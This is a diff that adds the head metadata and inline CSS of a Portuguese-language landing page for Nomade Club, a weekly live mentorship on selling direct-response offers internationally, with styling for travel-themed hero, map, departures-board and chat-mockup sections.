@@ -1,0 +1,1483 @@
+<!DOCTYPE html>
+<html lang="pt-BR" style="scroll-behavior: smooth;"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Nomade Club</title>
+<meta name="description" content="Nomade Club: a mentoria ao vivo, toda semana, onde Jeferson Borges ensina a criar, validar e escalar ofertas de direct response para vender no mundo inteiro.">
+<meta property="og:title" content="Nomade Club">
+<meta property="og:description" content="Aprenda a vender para o mundo e faturar em moeda forte, ao vivo, toda semana.">
+<meta property="og:image" content="https://nomadeclub.com.br/midia/og-image.jpg">
+<meta property="og:url" content="https://nomadeclub.com.br/">
+<meta property="og:type" content="website">
+<link rel="canonical" href="https://nomadeclub.com.br/">
+<meta name="theme-color" content="#140B14">
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com/">
+<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Onest:wght@300..800&amp;display=swap">
+<style>
+/* Layout: golden-hour cinema. Full-bleed travel photography opens and closes the page; between them a warm dusk letter
+   column, one light "sky" chapter for the founder's story, and motion set pieces (flight map, departures board,
+   stacked method cards, pinned travel reel). One family (Onest), gold reserved for action and key phrases. */
+:root{
+  --dusk:#140B14;
+  --dusk-2:#1C1019;
+  --dusk-3:#271522;
+  --dusk-4:#331B2C;
+  --line:rgba(255,226,206,.12);
+  --text:#FFF7F0;
+  --body:#EBDCD3;
+  --muted:#BFA79E;
+  --sun:#FFC24B;
+  --sun-2:#FF9E3D;
+  --peach:#FFD9BD;
+  --rose:#FF8A86;
+  --go:#5BE3A3;
+  --sky-1:#FDE7D4;
+  --sky-2:#F8D2C8;
+  --sky-3:#E5D0EA;
+  --ink:#2A1424;
+  --ink-2:#6A4A5B;
+  --paper:#FFF2E8;
+  --flap:#1D111A;
+  --flap-2:#2A1925;
+  --flap-text:#FFEAD6;
+  --font:"Onest",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+  --gutter:max(16px,5vw);
+  --col:38rem;
+  --wide:74rem;
+  --mid:62rem;
+  --ease-out:cubic-bezier(.23,1,.32,1);
+  color-scheme:dark;
+}
+*{box-sizing:border-box}
+[hidden]{display:none!important}
+html{-webkit-text-size-adjust:100%;overflow-x:clip}
+body{margin:0;background:var(--dusk);color:var(--body);font-family:var(--font);font-size:17px;line-height:1.7;-webkit-font-smoothing:antialiased;overflow-x:clip}
+@media (min-width:900px){body{font-size:18px}}
+img,video{max-width:100%;display:block}
+a{color:inherit}
+:focus-visible{outline:2px solid var(--sun);outline-offset:3px;border-radius:6px}
+.in{padding-inline:var(--gutter);margin-inline:auto;max-width:calc(var(--wide) + 2*var(--gutter))}
+.col{max-width:var(--col);margin-inline:auto}
+.mid{max-width:var(--mid);margin-inline:auto}
+.sec{padding-block:clamp(72px,10vw,128px)}
+
+/* type */
+h1,h2,h3{margin:0;color:var(--text);text-wrap:balance}
+h1{font-weight:650;font-size:clamp(2rem,3.3vw,3.3rem);line-height:1.06;letter-spacing:-.03em}
+h2{font-weight:650;font-size:clamp(1.8rem,2.4vw + .5rem,2.8rem);line-height:1.1;letter-spacing:-.03em}
+h3{font-weight:650;font-size:1.2rem;line-height:1.25;letter-spacing:-.015em}
+p{margin:0;text-wrap:pretty}
+.gold{color:var(--sun)}
+h1 em,h2 em{font-style:normal;color:var(--sun)}
+.letter{display:grid;gap:1.05em}
+.letter strong{color:var(--text);font-weight:650}
+.big{font-weight:600;font-size:clamp(1.3rem,1.1vw + .95rem,1.7rem);line-height:1.3;letter-spacing:-.02em;color:var(--text)}
+.muted{color:var(--muted)}
+.tag{justify-self:start;display:inline-flex;align-items:center;gap:.55em;font-size:.82rem;font-weight:600;color:var(--peach);padding:.45em .9em .45em .75em;border-radius:999px;background:rgba(255,217,189,.07);border:1px solid rgba(255,217,189,.18)}
+.tag i{width:6px;height:6px;border-radius:50%;background:var(--sun)}
+.sh{display:grid;gap:16px;margin-bottom:clamp(28px,4vw,44px)}
+.sh.center{justify-items:center;text-align:center}
+.sh p{max-width:36em}
+
+/* word reveal */
+.w{display:inline-block;overflow:hidden;vertical-align:top;padding:.1em 0 .1em;margin:-.1em 0 -.1em}
+.w > span{display:inline-block}
+
+/* buttons */
+.cta{position:relative;display:inline-flex;align-items:center;justify-content:center;gap:.8em;min-height:58px;padding:0 .55em 0 1.6em;border-radius:999px;background:linear-gradient(180deg,#FFD47A,var(--sun) 55%,#F3A93A);color:#2A1405;font-family:var(--font);font-weight:700;font-size:1rem;letter-spacing:-.01em;text-decoration:none;box-shadow:0 1px 0 rgba(255,255,255,.6) inset,0 -1px 0 rgba(0,0,0,.12) inset,0 18px 40px -16px rgba(255,158,61,.95);transition:transform .2s var(--ease-out),box-shadow .2s ease;-webkit-tap-highlight-color:transparent}
+.cta .ar{width:40px;height:40px;border-radius:50%;background:#2A1405;color:var(--sun);display:grid;place-items:center;flex:none;transition:transform .25s var(--ease-out)}
+.cta .ar svg{width:16px;height:16px}
+.cta:active{transform:scale(.97)}
+@media (hover:hover) and (pointer:fine){.cta:hover{transform:translateY(-2px);box-shadow:0 1px 0 rgba(255,255,255,.6) inset,0 24px 48px -16px rgba(255,158,61,1)}.cta:hover .ar{transform:translateX(3px)}}
+.cta.block{display:flex;width:100%}
+.micro{display:flex;flex-wrap:wrap;gap:4px 16px;font-size:.82rem;color:var(--muted);line-height:1.5}
+.micro span{display:inline-flex;align-items:center;gap:.4em}
+.micro svg{width:14px;height:14px;color:var(--go)}
+.cta-row{display:flex;flex-wrap:wrap;align-items:center;gap:14px 22px;margin-top:2rem}
+.cta-row.center{justify-content:center;text-align:center}
+
+/* progress */
+.prog{position:fixed;left:0;right:0;top:0;z-index:70;height:calc(2px + env(safe-area-inset-top,0px));padding-top:env(safe-area-inset-top,0px);pointer-events:none}
+.prog-fill{position:absolute;left:0;bottom:0;height:2px;width:100%;transform-origin:left;transform:scaleX(0);background:linear-gradient(90deg,var(--sun-2),var(--sun))}
+.prog-sun{position:absolute;bottom:-4px;left:0;width:10px;height:10px;margin-left:-5px;border-radius:50%;background:#FFE6A8;box-shadow:0 0 12px 4px rgba(255,194,75,.7)}
+
+/* ============ HERO ============ */
+.hero{position:relative;overflow:hidden;display:flex;flex-direction:column;min-height:760px}
+.hero-media{position:absolute;inset:0;overflow:hidden}
+.hero-media img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;object-position:38% 30%;transform:scale(1.04);animation:kb 26s ease-in-out infinite alternate}
+@keyframes kb{to{transform:scale(1.14) translate(-1.5%,1%)}}
+.hero-media::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,rgba(20,11,20,.5) 0%,transparent 16%,transparent 42%,rgba(20,11,20,.86) 76%,var(--dusk) 100%)}
+.flare{position:absolute;width:70vmax;height:70vmax;right:-20vmax;top:-18vmax;border-radius:50%;background:radial-gradient(circle,rgba(255,194,75,.3) 0%,rgba(255,158,61,.1) 35%,transparent 65%);mix-blend-mode:screen;animation:flare 11s ease-in-out infinite alternate;pointer-events:none}
+@keyframes flare{to{transform:translate(-5%,6%) scale(1.08);opacity:.7}}
+.grain{position:absolute;inset:0;pointer-events:none;opacity:.1;mix-blend-mode:overlay;background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='200' height='200'><filter id='n'><feTurbulence type='fractalNoise' baseFrequency='.85' numOctaves='3' stitchTiles='stitch'/></filter><rect width='100%25' height='100%25' filter='url("https://nomadeclub.com.br/%23n")'/></svg>")}
+.hero-in{position:relative;z-index:3;width:100%;max-width:calc(var(--wide) + 2*var(--gutter));margin:0 auto;padding:22px var(--gutter) clamp(40px,6vw,64px);display:flex;flex-direction:column;flex:1;gap:48px}
+.topbar{display:flex;justify-content:space-between;align-items:center;gap:12px}
+.brand{display:inline-flex;align-items:center;gap:10px;font-weight:700;font-size:1.02rem;color:var(--text);text-decoration:none;letter-spacing:-.01em}
+.logo{width:24px;height:24px;flex:none}
+.chip{font-size:.78rem;font-weight:600;color:var(--text);padding:.5em .95em;border-radius:999px;background:rgba(255,247,240,.08);border:1px solid rgba(255,247,240,.2);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);white-space:nowrap}
+.hero-copy{display:grid;gap:22px;max-width:36rem;margin-top:40svh}
+.pre{justify-self:start;display:inline-flex;align-items:center;gap:.6em;font-size:.84rem;font-weight:600;color:var(--peach);padding:.5em .95em .5em .75em;border-radius:999px;background:rgba(20,11,20,.5);border:1px solid rgba(255,217,189,.22);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);line-height:1.35}
+.pre i{width:7px;height:7px;border-radius:50%;background:var(--go);flex:none;animation:ping 2s infinite}
+@keyframes ping{0%{box-shadow:0 0 0 0 rgba(91,227,163,.6)}80%,100%{box-shadow:0 0 0 8px rgba(91,227,163,0)}}
+.hero .sub{font-size:clamp(1rem,1vw + .3rem,1.12rem);line-height:1.65;color:var(--body);max-width:33em}
+.proof{display:flex;flex-wrap:wrap;border-top:1px solid rgba(255,247,240,.14);padding-top:20px;max-width:40rem;row-gap:12px}
+.proof div{padding-right:clamp(16px,2.4vw,28px);margin-right:clamp(16px,2.4vw,28px);border-right:1px solid rgba(255,247,240,.14);display:grid;gap:1px}
+.proof div:last-child{border:0;margin:0;padding:0}
+.proof b{font-weight:700;font-size:clamp(1.15rem,1vw + .8rem,1.4rem);letter-spacing:-.02em;color:var(--text);font-variant-numeric:tabular-nums;white-space:nowrap}
+.proof small{font-size:.76rem;color:var(--muted)}
+.glass{position:absolute;z-index:3;translate:0 var(--py,0px);right:16px;top:30svh;width:min(210px,52vw);padding:12px 14px;border-radius:18px;background:rgba(30,16,26,.45);border:1px solid rgba(255,247,240,.18);backdrop-filter:blur(14px) saturate(1.3);-webkit-backdrop-filter:blur(14px) saturate(1.3);box-shadow:0 30px 60px -30px rgba(0,0,0,.7);display:grid;gap:4px;animation:bob 6s ease-in-out infinite}
+.glass small{font-size:.7rem;color:var(--peach);font-weight:600}
+.glass b{font-size:1.4rem;letter-spacing:-.025em;color:var(--text);font-weight:700}
+.glass span{font-size:.74rem;color:var(--body)}
+.glass svg{height:30px;width:100%;margin-top:4px}
+.glass .spark-line{stroke-dasharray:260;stroke-dashoffset:260;animation:draw 2.2s .6s var(--ease-out) forwards}
+@keyframes draw{to{stroke-dashoffset:0}}
+@keyframes bob{50%{transform:translateY(-8px)}}
+.coin{position:absolute;z-index:2;translate:0 var(--py,0px);display:grid;place-items:center;width:42px;height:42px;border-radius:14px;background:rgba(255,247,240,.1);border:1px solid rgba(255,247,240,.22);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);font-weight:700;color:var(--sun);animation:bob 7s ease-in-out infinite;pointer-events:none}
+@media (min-width:900px){
+  .hero{min-height:780px}
+  .hero-media{left:38%;-webkit-mask-image:linear-gradient(90deg,transparent 0%,#000 32%);mask-image:linear-gradient(90deg,transparent 0%,#000 32%)}
+  .hero-media img{object-position:72% 74%;transform-origin:75% 75%}
+  .hero-media::after{background:linear-gradient(180deg,rgba(20,11,20,.45) 0%,transparent 18%,transparent 72%,var(--dusk) 100%)}
+  .hero-copy{margin-top:auto;margin-bottom:auto}
+  .glass{top:110px;bottom:auto;right:max(16px,4vw);width:250px;padding:14px 16px}
+  .glass b{font-size:1.55rem}
+}
+@media (max-width:899px){
+  .hero-media{bottom:auto;height:80svh}
+  .hero-media img{transform-origin:75% 80%;object-position:70% 100%}
+  .hero-copy{margin-top:50svh}
+  .glass{left:16px;right:auto;top:19svh}
+  .flare{top:-30vmax}
+}
+
+/* ============ MARQUEE ============ */
+.band{position:relative;overflow:hidden;padding-block:26px;border-block:1px solid var(--line);background:linear-gradient(180deg,var(--dusk),var(--dusk-2))}
+.band-track{display:flex;width:max-content;animation:marq 40s linear infinite}
+.band.js .band-track{animation:none}
+.band ul{display:flex;align-items:center;list-style:none;margin:0;padding:0}
+.band li{display:flex;align-items:center;gap:26px;padding-right:26px;font-weight:650;font-size:clamp(1.6rem,3vw,2.6rem);letter-spacing:-.03em;white-space:nowrap;line-height:1}
+.band li:nth-child(odd) span{color:transparent;-webkit-text-stroke:1px rgba(255,217,189,.55)}
+.band li span{color:var(--text)}
+.band li svg{width:26px;height:26px;color:var(--sun);flex:none}
+@keyframes marq{to{transform:translateX(-50%)}}
+
+/* ============ LEAD ============ */
+.pull{position:relative;padding:6px 0 6px 22px;border-left:2px solid var(--sun);margin-block:.6em}
+.pull .big{font-size:clamp(1.45rem,1.6vw + 1rem,2.1rem);line-height:1.22}
+
+/* ============ SKY (about) ============ */
+.sky{position:relative;color:var(--ink);background:linear-gradient(180deg,var(--sky-1) 0%,var(--sky-2) 48%,var(--sky-3) 100%);overflow:hidden}
+.sky .sun-disc{position:absolute;translate:0 var(--py,0px);width:420px;height:420px;right:-120px;top:-120px;border-radius:50%;background:radial-gradient(circle,rgba(255,194,75,.55),rgba(255,158,61,.15) 45%,transparent 70%);pointer-events:none}
+.sky h2,.sky h3{color:var(--ink)}
+.sky h2 em{color:#C2560F}
+.sky .tag{color:#8A3F1A;background:rgba(255,255,255,.45);border-color:rgba(42,20,36,.12)}
+.sky .tag i{background:#E8771F}
+.sky .letter p{color:#3B2233}
+.sky .letter strong{color:var(--ink)}
+.sky .big{color:var(--ink)}
+.steps{list-style:none;margin:0;padding:0;display:grid;gap:12px;counter-reset:s}
+.steps li{counter-increment:s;display:grid;grid-template-columns:42px 1fr;gap:14px;align-items:start;padding:16px;border-radius:18px;background:rgba(255,255,255,.5);box-shadow:0 1px 0 rgba(255,255,255,.7) inset,0 10px 30px -18px rgba(42,20,36,.35)}
+.steps li::before{content:counter(s);width:42px;height:42px;border-radius:50%;display:grid;place-items:center;background:var(--ink);color:var(--sun);font-weight:700}
+.steps b{display:block;color:var(--ink);font-weight:650;line-height:1.3;margin-bottom:2px}
+.steps span{color:#4A2F40}
+.feature{display:grid;gap:26px;align-items:center;margin-block:clamp(40px,6vw,64px)}
+@media (min-width:860px){.feature{grid-template-columns:300px minmax(0,1fr);gap:48px}}
+.feature .stat{font-weight:700;font-size:clamp(2.2rem,3vw + 1rem,3.6rem);line-height:1;letter-spacing:-.04em;color:var(--ink)}
+.feature .stat span{color:#C2560F}
+.feature .when{font-size:.85rem;font-weight:650;color:#8A3F1A}
+
+/* travel reel (pinned horizontal) */
+.reel{position:relative;margin-top:clamp(40px,6vw,72px)}
+.reel-track{display:flex;gap:18px;width:max-content;padding-inline:var(--gutter);will-change:transform}
+.reel:not(.pinned){overflow-x:auto;scroll-snap-type:x mandatory;scrollbar-width:none}
+.reel:not(.pinned)::-webkit-scrollbar{display:none}
+.reel:not(.pinned) .reel-card{scroll-snap-align:center}
+.reel-card{position:relative;flex:none;width:min(72vw,340px);aspect-ratio:3/4;border-radius:24px;overflow:hidden;box-shadow:0 30px 60px -30px rgba(42,20,36,.6);margin:0}
+.reel-card img{width:100%;height:100%;object-fit:cover;transform:scale(1.08)}
+.reel-card figcaption{position:absolute;left:12px;bottom:12px;padding:.45em .85em;border-radius:999px;font-size:.82rem;font-weight:650;color:var(--text);background:rgba(20,11,20,.7);border:1px solid rgba(255,247,240,.2)}
+.reel-intro{flex:none;width:min(72vw,340px);display:grid;align-content:end;gap:10px;padding:24px;border-radius:24px;background:var(--ink);color:var(--text)}
+.reel-intro b{font-size:clamp(2.6rem,4vw,3.6rem);font-weight:700;letter-spacing:-.04em;line-height:1;color:var(--sun)}
+.reel-intro p{color:#EBDCD3;font-size:.95rem}
+
+/* ============ VIDEO CARDS ============ */
+.vcard{position:relative;margin:0;border-radius:22px;overflow:hidden;background:#000;aspect-ratio:9/16;box-shadow:0 30px 60px -30px rgba(0,0,0,.85),0 0 0 1px rgba(255,247,240,.08);min-width:0}
+.vcard video{width:100%;height:100%;object-fit:cover}
+.vcard .play{position:absolute;inset:0;border:0;padding:0;cursor:pointer;color:#fff;background:linear-gradient(180deg,rgba(0,0,0,0) 45%,rgba(20,11,20,.85));display:grid;place-items:center}
+.vcard .play span{width:64px;height:64px;border-radius:50%;display:grid;place-items:center;background:rgba(255,247,240,.16);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);border:1px solid rgba(255,247,240,.4);transition:transform .25s var(--ease-out),background .2s ease}
+.vcard .play svg{width:22px;height:22px;margin-left:3px}
+@media (hover:hover){.vcard .play:hover span{transform:scale(1.08);background:var(--sun);color:#2A1405}}
+.vcard figcaption{position:absolute;left:14px;right:14px;bottom:14px;display:grid;gap:0;pointer-events:none}
+.vcard figcaption small{font-size:.72rem;font-weight:600;color:var(--peach)}
+.vcard figcaption b{font-size:1.3rem;font-weight:700;letter-spacing:-.02em;color:var(--text)}
+.vcard.playing .play,.vcard.playing figcaption{display:none}
+.passes{display:grid;grid-auto-flow:column;grid-auto-columns:min(70vw,280px);gap:16px;overflow-x:auto;scroll-snap-type:x mandatory;padding:6px var(--gutter) 18px;margin-inline:calc(-1*var(--gutter));scrollbar-width:none}
+.passes::-webkit-scrollbar{display:none}
+.passes > *{scroll-snap-align:center}
+@media (min-width:1100px){.passes{grid-auto-flow:row;grid-template-columns:repeat(4,minmax(0,1fr));overflow:visible;margin-inline:0;padding-inline:0}}
+
+/* ============ OPPORTUNITY ============ */
+.reasons{display:grid;gap:14px;margin-block:2em}
+@media (min-width:900px){.reasons{grid-template-columns:repeat(3,minmax(0,1fr))}}
+.card{border-radius:22px;background:linear-gradient(180deg,var(--dusk-3),var(--dusk-2));box-shadow:0 1px 0 rgba(255,247,240,.06) inset,0 30px 60px -40px rgba(0,0,0,.9);padding:24px}
+.reason{display:grid;gap:10px;align-content:start}
+.reason .n{font-weight:700;font-size:2.4rem;line-height:1;letter-spacing:-.04em;color:transparent;-webkit-text-stroke:1.2px var(--rose)}
+.reason p{color:var(--body);font-size:.96em}
+.mapwrap{position:relative;margin-top:clamp(32px,5vw,56px);border-radius:28px;overflow:hidden;background:radial-gradient(100% 80% at 50% 0%,#2A1522 0%,var(--dusk) 75%);box-shadow:0 0 0 1px var(--line)}
+#map{display:block;width:100%;aspect-ratio:16/8}
+@media (max-width:700px){#map{aspect-ratio:4/3}}
+.map-legend{position:absolute;left:16px;top:14px;display:inline-flex;align-items:center;gap:.5em;font-size:.78rem;font-weight:600;color:var(--peach);padding:.4em .8em;border-radius:999px;background:rgba(20,11,20,.6);border:1px solid var(--line)}
+.map-legend i{width:7px;height:7px;border-radius:50%;background:var(--sun);box-shadow:0 0 8px var(--sun)}
+.board{margin-top:16px;border-radius:24px;padding:clamp(14px,3vw,24px);background:linear-gradient(180deg,#170D15,#100810);box-shadow:0 0 0 1px var(--line),0 40px 80px -40px rgba(0,0,0,.9);overflow-x:auto}
+.board-top{display:flex;justify-content:space-between;align-items:center;gap:12px;padding-bottom:12px;margin-bottom:8px;border-bottom:1px solid var(--line)}
+.board-top b{display:inline-flex;align-items:center;gap:.5em;color:var(--text);font-weight:650}
+.board-top b svg{width:20px;height:20px;color:var(--sun)}
+.board-top span{font-size:.8rem;color:var(--muted);font-variant-numeric:tabular-nums}
+.board-head,.board-row{display:grid;grid-template-columns:auto minmax(100px,1fr) auto;gap:8px 18px;align-items:center}
+.board-head{font-size:.72rem;font-weight:600;color:var(--muted);padding-bottom:6px}
+.board-row{padding-block:7px;border-top:1px solid rgba(255,226,206,.05)}
+.board-row .cur-list{font-size:.86rem;color:var(--body)}
+.status{display:inline-flex;align-items:center;gap:.45em;font-size:.82rem;font-weight:650;color:var(--go);white-space:nowrap}
+.status::before{content:"";width:7px;height:7px;border-radius:50%;background:currentColor;animation:blink 1.4s steps(2,start) infinite}
+.status.full{color:var(--rose)}
+.status.full::before{animation:none}
+.status .short{display:none}
+@keyframes blink{50%{opacity:.25}}
+.flaps{display:flex;gap:3px;font-size:clamp(13px,1.6vw,19px)}
+.cell{position:relative;flex:none;width:1.02em;height:1.46em;display:grid;place-items:center;font-weight:700;color:var(--flap-text);background:linear-gradient(180deg,var(--flap-2) 0 49.5%,#0B060A 49.5% 50.5%,var(--flap) 50.5%);border-radius:3px;box-shadow:0 1px 0 rgba(255,255,255,.05) inset,0 2px 4px rgba(0,0,0,.4);overflow:hidden;line-height:1;perspective:200px}
+.cell.gone{width:0;margin-right:-3px;opacity:0;transition:width .35s ease,margin .35s ease,opacity .25s ease}
+.cell .ch{display:block;backface-visibility:hidden}
+.cell.f .ch{animation:flip .085s linear}
+.cell.f::before{content:"";position:absolute;inset:0 0 50% 0;background:linear-gradient(180deg,transparent,rgba(0,0,0,.55));animation:shade .085s linear}
+@keyframes flip{0%{transform:rotateX(0)}50%{transform:rotateX(-80deg)}51%{transform:rotateX(80deg)}100%{transform:rotateX(0)}}
+@keyframes shade{0%,100%{opacity:0}50%{opacity:1}}
+@media (max-width:560px){
+  .board-head,.board-row{grid-template-columns:1fr auto}
+  .board-head span:nth-child(2),.board-row .cur-list{display:none}
+  .board-row .flaps{font-size:12px;gap:2px}
+  .status .long{display:none}.status .short{display:inline}
+}
+.markets{display:grid;gap:10px;margin-top:clamp(28px,4vw,40px)}
+@media (min-width:860px){.markets{grid-template-columns:repeat(2,minmax(0,1fr))}}
+.market{display:grid;gap:4px;padding:18px 20px;border-radius:18px;background:rgba(255,247,240,.03);box-shadow:0 0 0 1px var(--line) inset}
+.market b{color:var(--sun);font-weight:650}
+.market.asia{background:linear-gradient(135deg,rgba(255,194,75,.14),rgba(255,138,134,.08));box-shadow:0 0 0 1px rgba(255,194,75,.35) inset}
+@media (min-width:860px){.market.asia{grid-row:span 2;align-content:center}}
+
+/* ============ METHOD (stacked cards) ============ */
+.stack{display:grid;gap:18px;margin-top:clamp(28px,4vw,44px)}
+.step{position:sticky;top:calc(76px + var(--i)*14px);min-height:300px;border-radius:28px;padding:clamp(24px,4vw,40px);display:grid;gap:14px;align-content:start;overflow:hidden;transform-origin:50% 0;box-shadow:0 -1px 0 rgba(255,247,240,.08) inset,0 40px 80px -40px rgba(0,0,0,.9)}
+.step:nth-child(1){background:linear-gradient(140deg,#3A1A33,#24101F)}
+.step:nth-child(2){background:linear-gradient(140deg,#5A2133,#2D1220)}
+.step:nth-child(3){background:linear-gradient(140deg,#7A3426,#3A1620)}
+.step:nth-child(4){background:linear-gradient(140deg,#9C5A1C,#4A1D1C)}
+.step .num{position:absolute;right:clamp(16px,3vw,32px);top:clamp(4px,2vw,12px);font-weight:800;font-size:clamp(6rem,14vw,11rem);line-height:1;letter-spacing:-.06em;color:transparent;-webkit-text-stroke:1.5px rgba(255,217,189,.22);pointer-events:none}
+.step h3{font-size:clamp(1.8rem,2.6vw + .6rem,2.8rem);font-weight:700;letter-spacing:-.035em}
+.step p{max-width:34em;color:#F2E2D8}
+.step .chip-s{justify-self:start;font-size:.78rem;font-weight:650;color:var(--peach);padding:.35em .8em;border-radius:999px;background:rgba(20,11,20,.35);border:1px solid rgba(255,217,189,.2)}
+
+/* ============ OBJECTIONS ============ */
+.obj{display:grid;gap:16px;padding-block:28px;border-top:1px solid var(--line)}
+.obj:first-of-type{border-top:0;padding-top:0}
+.bubble-wrap{display:flex;align-items:flex-end;gap:10px}
+.av{width:34px;height:34px;border-radius:50%;flex:none;background:linear-gradient(135deg,var(--dusk-4),var(--dusk-3));box-shadow:0 0 0 1px var(--line) inset;display:grid;place-items:center;color:var(--muted)}
+.av svg{width:18px;height:18px}
+.bubble{position:relative;max-width:30em;background:var(--paper);color:var(--ink);font-weight:600;font-size:1.06rem;line-height:1.35;padding:13px 17px;border-radius:20px 20px 20px 6px;box-shadow:0 18px 40px -24px rgba(0,0,0,.8)}
+.typing{display:flex;gap:4px;padding:13px 15px;background:var(--paper);border-radius:20px 20px 20px 6px}
+.typing i{width:6px;height:6px;border-radius:50%;background:#8E6F7E;animation:dots 1s infinite}
+.typing i:nth-child(2){animation-delay:.15s}.typing i:nth-child(3){animation-delay:.3s}
+@keyframes dots{0%,80%,100%{opacity:.3;transform:none}40%{opacity:1;transform:translateY(-3px)}}
+
+/* ============ CLUB ============ */
+.pillars{display:grid;gap:14px}
+@media (min-width:720px){.pillars{grid-template-columns:repeat(2,minmax(0,1fr))}}
+.pillar{position:relative;display:grid;grid-template-columns:auto 1fr;gap:6px 16px;overflow:hidden}
+.pillar::before{content:"";position:absolute;inset:0;background:radial-gradient(240px circle at var(--mx,50%) var(--my,50%),rgba(255,194,75,.14),transparent 60%);opacity:0;transition:opacity .3s ease;pointer-events:none}
+@media (hover:hover){.pillar:hover::before{opacity:1}}
+.pillar .ic{grid-row:span 2;width:48px;height:48px;border-radius:14px;display:grid;place-items:center;background:rgba(255,194,75,.12);color:var(--sun)}
+.pillar .ic svg{width:24px;height:24px}
+.pillar p{font-size:.95em}
+.notice{display:grid;grid-template-columns:auto 1fr;gap:16px;margin-top:22px;padding:24px;border-radius:22px;background:linear-gradient(135deg,rgba(255,194,75,.12),rgba(255,138,134,.06));box-shadow:0 0 0 1px rgba(255,194,75,.35) inset}
+.notice .ic{width:36px;height:36px;border-radius:50%;background:var(--sun);color:#2A1405;display:grid;place-items:center;font-weight:800}
+.notice h3{margin-bottom:.5em;color:var(--sun)}
+.notice .letter{gap:.7em}
+
+/* timetable */
+.tt-grid{display:grid;gap:14px}
+@media (min-width:900px){.tt-grid{grid-template-columns:1.3fr 1fr 1fr;align-items:start}}
+.tt{padding:0;overflow:hidden}
+.tt header{display:flex;align-items:center;justify-content:space-between;gap:10px;padding:18px 22px;border-bottom:1px solid var(--line)}
+.tt header b{color:var(--text);font-weight:700;font-size:1.1rem;letter-spacing:-.02em}
+.tt header span{font-size:.76rem;font-weight:650;color:var(--go);display:inline-flex;align-items:center;gap:.4em}
+.tt header span::before{content:"";width:6px;height:6px;border-radius:50%;background:currentColor}
+.tt ul{list-style:none;margin:0;padding:8px 22px 14px;display:grid}
+.tt li{display:grid;grid-template-columns:14px 1fr;gap:10px;padding:10px 0;border-bottom:1px dashed var(--line);font-size:.95em}
+.tt li:last-child{border-bottom:0}
+.tt li::before{content:"";width:6px;height:6px;border-radius:50%;background:var(--sun);margin-top:.7em}
+.tt .foot{padding:0 22px 20px;font-size:.84em;color:var(--muted)}
+
+/* bonus */
+.bonuses{display:grid;gap:16px}
+.bonuses > *,.ai-grid > *{min-width:0}
+@media (min-width:980px){.bonuses{grid-template-columns:1fr 1fr}.bonus.main{grid-column:1/-1}}
+.bonus{position:relative;padding:clamp(24px,3vw,34px)}
+.bonus .bn{display:inline-flex;font-size:.78rem;font-weight:700;color:#2A1405;background:var(--sun);padding:.3em .75em;border-radius:999px;margin-bottom:12px}
+.bonus h3{font-size:clamp(1.4rem,1.2vw + 1rem,1.9rem);font-weight:700;letter-spacing:-.03em;margin-bottom:.5em}
+.bonus .letter{gap:.8em}
+.bonus.main{background:radial-gradient(80% 100% at 100% 0%,rgba(255,158,61,.22),transparent 60%),linear-gradient(180deg,var(--dusk-3),var(--dusk-2));box-shadow:0 0 0 1px rgba(255,194,75,.28) inset,0 40px 80px -40px rgba(0,0,0,.9)}
+.ai-grid{display:grid;gap:28px;align-items:center}
+@media (min-width:900px){.ai-grid{grid-template-columns:minmax(0,1fr) 300px;gap:48px}}
+/* phone */
+.phone{position:relative;justify-self:center;width:min(100%,290px);aspect-ratio:300/610;border-radius:44px;padding:10px;background:linear-gradient(145deg,#3A2A34,#120A10);box-shadow:0 0 0 1.5px #4A3542 inset,0 50px 90px -40px rgba(0,0,0,.95),0 0 80px -20px rgba(255,158,61,.35)}
+.phone::before{content:"";position:absolute;top:19px;left:50%;width:86px;height:24px;transform:translateX(-50%);background:#000;border-radius:14px;z-index:3}
+.screen{position:relative;height:100%;border-radius:35px;overflow:hidden;background:linear-gradient(180deg,#1E1019,#140B14);display:flex;flex-direction:column}
+.app-bar{display:flex;align-items:center;gap:10px;padding:52px 14px 12px;border-bottom:1px solid rgba(255,247,240,.07)}
+.avatar{width:34px;height:34px;border-radius:50%;display:grid;place-items:center;background:conic-gradient(from 200deg,var(--sun),var(--sun-2),var(--rose),var(--sun));color:#2A1405;font-weight:800;font-size:.75rem;flex:none}
+.app-bar b{display:block;font-weight:650;font-size:.84rem;line-height:1.2;color:var(--text)}
+.app-bar small{font-size:.7rem;color:var(--go);display:inline-flex;align-items:center;gap:.35em}
+.app-bar small::before{content:"";width:6px;height:6px;border-radius:50%;background:currentColor}
+.chat{flex:1;display:flex;flex-direction:column;justify-content:flex-end;gap:8px;padding:12px;font-size:.76rem;line-height:1.35;overflow:hidden}
+.msg{max-width:86%;padding:9px 11px;border-radius:16px;animation:pop .35s var(--ease-out) both}
+.msg.me{align-self:flex-end;background:linear-gradient(180deg,#FFD47A,var(--sun));color:#2A1405;border-bottom-right-radius:5px;font-weight:600}
+.msg.ai{align-self:flex-start;background:#2B1826;color:#F3E6DD;border-bottom-left-radius:5px}
+.msg.ai ul{list-style:none;margin:6px 0 0;padding:0;display:grid;gap:5px}
+.msg.ai li{display:flex;gap:7px;align-items:center;animation:pop .3s ease both}
+.msg.ai li svg{width:13px;height:13px;color:var(--go);flex:none}
+.ptyping{align-self:flex-start;display:flex;gap:4px;padding:11px 13px;background:#2B1826;border-radius:16px;border-bottom-left-radius:5px}
+.ptyping i{width:6px;height:6px;border-radius:50%;background:#A88C97;animation:dots 1s infinite}
+.ptyping i:nth-child(2){animation-delay:.15s}.ptyping i:nth-child(3){animation-delay:.3s}
+.camp{align-self:stretch;border-radius:14px;padding:10px 12px;background:#21131D;border:1px solid rgba(91,227,163,.35);display:grid;grid-template-columns:1fr auto;gap:2px 8px;animation:pop .4s ease both}
+.camp b{font-weight:650;font-size:.78rem;color:var(--text)}
+.camp small{grid-column:1;color:var(--muted);font-size:.68rem}
